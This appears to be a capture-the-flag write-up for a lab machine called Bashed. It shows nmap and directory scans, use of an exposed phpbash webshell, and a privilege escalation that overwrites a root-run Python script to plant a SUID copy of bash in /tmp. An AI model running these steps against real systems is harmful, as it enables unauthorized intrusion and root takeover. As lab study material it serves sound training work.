# Recon

All-tcp scan:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.10.68
PORT   STATE SERVICE
80/tcp open  http
```

Detailed scan:
```bash
nmap -p 80 -sVC -oA scans/nmap-tcpdetail 10.10.10.68
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Endpoint scan:
```bash
301      GET        9l       28w      309c http://bashed.htb/images
200      GET      154l      394w     7477c http://bashed.htb/single.html
301      GET        9l       28w      310c http://bashed.htb/uploads => http://bashed.htb/uploads/
301      GET        9l       28w      306c http://bashed.htb/dev => http://bashed.htb/dev/
200      GET        1l      255w     4559c http://bashed.htb/dev/phpbash.min.php
200      GET      216l      489w     8151c http://bashed.htb/dev/phpbash.php
301      GET        9l       28w      306c http://bashed.htb/php => http://bashed.htb/php/
200      GET        0l        0w        0c http://bashed.htb/php/sendMail.php
200      GET        8l       35w     2447c http://bashed.htb/images/logo.png
200      GET      161l      397w     7743c http://bashed.htb/index.html
200      GET      161l      397w     7743c http://bashed.htb/
```

At this point, subdomain scan wasn't needed to get user access. 

# Shell as www-data

We simply navigate do [http://bashed.htb/dev/phpbash.php](http://bashed.htb/dev/phpbash.php),
which was discovered by our endpoint (directory) scan, and we have a fully functional webshell.

Sadly, no matter what we try, we won't be able to obtain reverse shell, as all outgoing
requests seem to be blocked, and we are also unable to plant a bind shell.
Instead, we will have to perform privilege escalation from the webshell we have.

User flag:
```
2bc**************************17f
```

# Shell as root
First, we run sudo -l, and it seems we can run all commands as scriptmanager.

To find out what can be done with this privilege, we run find:

```bash
find / -user scriptmanager 2>/dev/null
/scripts
```

Inside this directory, there are two files:

```
test.py
test.txt
```

Inside test.py there is a simple program that writes to test.txt file.
Interesting thing is, that test.py is scriptmanager owned,
while test.py is root owned. That would mean, that test.py isn't run by
scriptmanager, but as root. Since we have write access to the test.py file,
we can modify it's content, so that when it's run by root, it will execute
our commands.

We make a simple script in /tmp:
```bash
echo "import os;os.system('cp /bin/bash /tmp/jjs');os.system('chmod 7777 /tmp/jjs')" > test.py
```
Then, we copy it to /scripts:
```bash
sudo -u scriptmanager cp /tmp/test.py /scripts/test.py
```

After a while, we get root suid shell in /tmp. We can use it as follows:

```bash
/tmp/jjs -p -c id
```

Root flag:
```
e0b**************************ae5
```
